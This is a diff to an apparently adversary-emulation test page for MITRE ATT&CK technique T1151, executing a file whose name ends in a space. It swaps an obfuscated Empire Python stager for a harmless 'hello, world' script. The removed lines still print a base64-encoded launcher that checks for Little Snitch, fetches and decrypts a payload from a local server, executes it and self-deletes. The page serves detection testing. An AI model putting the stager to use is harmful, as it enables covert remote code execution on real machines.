@@ -2,13 +2,11 @@
 
 MITRE ATT&CK Technique: [T1151](https://attack.mitre.org/wiki/Technique/T1151)
 
-### Generate Binary 
-    echo '#!/bin/bash\necho "import sys,base64,warnings;warnings.filterwarnings(\"ignore\");exec(base64.b64decode(\"aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9hZG1pbi9nZXQucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249U2lSUHRGUmdrM3l5UnFhVksraXVrdUNDbDhnPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJ01CNSlWYWw9dV9MSFUjN2Y2dC4qLUAobnBlb3FpNHk6JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==\"));" | /usr/bin/python &\nrm -f "$0"\nexit' > shell.txt && chmod +x shell.txt
+### Generate Binary
+    echo '#!/bin/bash\necho "print \"hello, world!\"" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt
 
 ### Add Space After Filename
-    mv shell.txt "shell.txt "
+    mv execute.txt "execute.txt "
 
 ### Execute
-    ./shell.txt\ 
-
-https://github.com/EmpireProject/Empire
+    ./execute.txt\ 
